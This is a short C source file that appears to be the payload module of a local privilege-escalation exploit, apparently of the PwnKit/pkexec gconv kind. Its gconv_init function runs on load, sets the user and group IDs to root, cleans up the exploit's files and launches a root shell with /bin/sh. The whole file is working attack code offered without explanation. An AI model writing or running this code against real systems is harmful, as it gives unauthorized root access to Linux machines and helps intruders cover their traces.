#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void payload() {
  setuid(0);
  setgid(0);
  setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/bin:/bin/:", 1);
  setenv("SHELL", "sh", 1);
  system("rm -rf GCONV_PATH=.");
  system("rm -rf privesc");
  system("/bin/sh");
  system("rm g2g");
  exit(0);
}

void gconv() {}

void gconv_init() {
  system("/usr/bin/touch g2g");
  payload();
}
